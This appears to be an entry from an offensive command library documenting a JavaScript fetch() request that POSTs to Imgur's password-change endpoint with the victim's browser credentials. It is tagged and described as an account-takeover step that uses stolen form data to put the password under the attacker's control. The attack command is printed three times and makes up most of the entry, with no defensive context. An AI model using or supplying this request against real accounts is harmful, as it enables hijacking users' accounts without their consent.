---
id: cmd-fetch-post-change
data: >-
  await fetch("https://imgur.com/account/settings/password", {"credentials":
  "include","headers": {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X
  10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Accept":
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language":
  "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3","Content-Type":
  "application/x-www-form-urlencoded","Upgrade-Insecure-Requests":
  "1"},"referrer": "https://imgur.com/account/settings/password","body":
  body,"method": "POST","mode": "cors"});
tags:
  - fetch
  - post
  - account-takeover
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:06.791Z'
verified: false
validated: true
submitted: true
---
# fetch-password-change-post

## Command

```javascript
await fetch("https://imgur.com/account/settings/password", {"credentials": "include","headers": {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3","Content-Type": "application/x-www-form-urlencoded","Upgrade-Insecure-Requests": "1"},"referrer": "https://imgur.com/account/settings/password","body": body,"method": "POST","mode": "cors"});
```

## Description

Sends POST request to password settings with stolen form data, including credentials, to change victim's password.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | "https://imgur.com/account/settings/password" | Yes |
| body | URL-encoded form data | Yes |
| method | "POST" | Yes |
| credentials | "include" | Yes |

## Examples

### Basic Usage

```javascript
await fetch("https://imgur.com/account/settings/password", {"credentials": "include","headers": {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3","Content-Type": "application/x-www-form-urlencoded","Upgrade-Insecure-Requests": "1"},"referrer": "https://imgur.com/account/settings/password","body": body,"method": "POST","mode": "cors"});
```

## Expected Output

Server response changing the password to attacker's control.

## Related

- [[procedures/Perform-Account-Takeover-via-Form-Manipulation]]
